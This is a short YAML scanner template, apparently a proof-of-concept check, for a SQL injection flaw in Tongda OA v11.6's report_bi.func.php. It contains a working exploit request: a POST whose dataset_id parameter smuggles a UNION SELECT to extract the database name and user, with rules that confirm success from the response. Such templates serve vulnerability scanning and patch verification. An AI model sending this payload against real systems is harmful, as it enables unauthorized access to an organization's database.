expression: r0()
id: tongda-report-bi-func-sql-inject
info:
  author: zan8in
  description: "\u901A\u8FBEOA v11.6 report_bi.func.php \u5B58\u5728SQL\u6CE8\u5165\
    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\
    \u53D6\u6570\u636E\u5E93\u4FE1\u606F\napp=\"TDXK-\u901A\u8FBEOA\"\n"
  name: "\u901A\u8FBEOA v11.6 report_bi.func.php SQL\u6CE8\u5165\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200  && response.body.bcontains(b'"col":') && response.body.bcontains(b'"td_oa"')
      && response.body.bcontains(b'"target":') && response.body.bcontains(b'"para":')
    request:
      body: '_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&

        '
      method: POST
      path: /general/bi_design/appcenter/report_bi.func.php
